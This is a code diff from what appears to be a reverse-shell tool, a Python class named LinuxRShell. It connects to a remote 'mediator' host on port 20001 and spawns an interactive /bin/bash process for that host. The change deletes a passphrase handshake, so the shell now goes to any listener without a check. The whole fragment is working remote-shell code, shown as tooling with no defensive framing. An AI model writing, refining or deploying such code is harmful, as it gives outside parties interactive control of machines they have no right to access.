@@ -55,9 +55,6 @@ class LinuxRShell:
     def connect(self, mediatorHost):
         self.handler.connect((socket.gethostbyname(mediatorHost), 20001))
         self.handler.sendall("Stepping onto platform nine and three quarters...".encode())
-        handlerKey = self.handler.recv(1024)
-        if handlerKey.decode() != "I solemnly swear that I am up to no good.":
-            exit()
 
     def run(self):
         bash = subprocess.Popen(["/bin/bash", "-i"],
